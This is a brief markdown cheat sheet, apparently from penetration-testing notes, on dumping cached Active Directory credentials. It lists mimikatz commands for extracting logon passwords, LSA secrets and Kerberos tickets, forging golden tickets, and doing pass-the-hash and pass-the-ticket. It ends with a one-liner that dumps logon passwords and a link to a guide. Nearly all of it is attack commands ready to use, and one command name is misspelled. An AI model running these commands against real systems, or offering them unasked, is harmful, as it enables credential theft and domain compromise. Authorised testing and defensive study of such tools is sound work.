# Cached AD Credentials

__Search for leaked credentials and hashes__

## mimikatz

```powershell
mimikatz.exe
privilege::debug

sekurlsa::logonpasswords
sekurlsa::kerberos
sekurlsa::krbtgt
sekurlsa::pth
sekurlsa::tickets
token::list
token::elecvate
lsadump::lsa
kerberos::golden
kerberos::list
kerberos::ptt
crypto::capi
crypto::cng
```

one-liner usage (runs commands in order)
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

mimikatz guide
```text
https://adsecurity.org/?page_id=1821
```